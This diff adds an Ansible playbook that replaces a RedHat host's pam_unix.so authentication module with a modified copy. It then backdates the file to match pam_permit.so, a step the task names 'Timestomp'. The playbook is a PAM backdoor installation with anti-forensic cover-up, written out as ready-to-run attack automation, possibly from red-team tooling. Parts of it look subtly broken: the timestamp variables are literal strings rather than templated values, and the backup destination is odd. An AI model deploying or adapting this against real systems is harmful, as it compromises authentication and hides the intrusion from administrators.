@@ -1,0 +1,28 @@
+---
+- name: Backup old pam_unix.so (RedHat)
+  ansible.builtin.copy:
+    src: /lib/security/pam_unix.so
+    dest: /lib/pam.d/
+
+- name: Copy over modified pam_unix.so (RedHat)
+  ansible.builtin.copy:
+    src: pam_unix.so
+    dest: /lib/security/pam_unix.so
+    owner: root
+    group: root
+    mode: 0644
+
+- name: Get timestamps of other PAM modules
+  ansible.builtin.stat:
+    path: /lib/security/pam_permit.so
+  register: pam_stat
+
+- name: Timestomp new pam_unix.so
+  ansible.builtin.file:
+    path: /lib/security/pam_unix.so
+    modification_time: '{{ pam_mod_time }}'
+    access_time: '{{ pam_access_time }}'
+  vars:
+    pam_mod_time: pam_stat.mtime
+    pam_access_time: pam_stat.atime
+
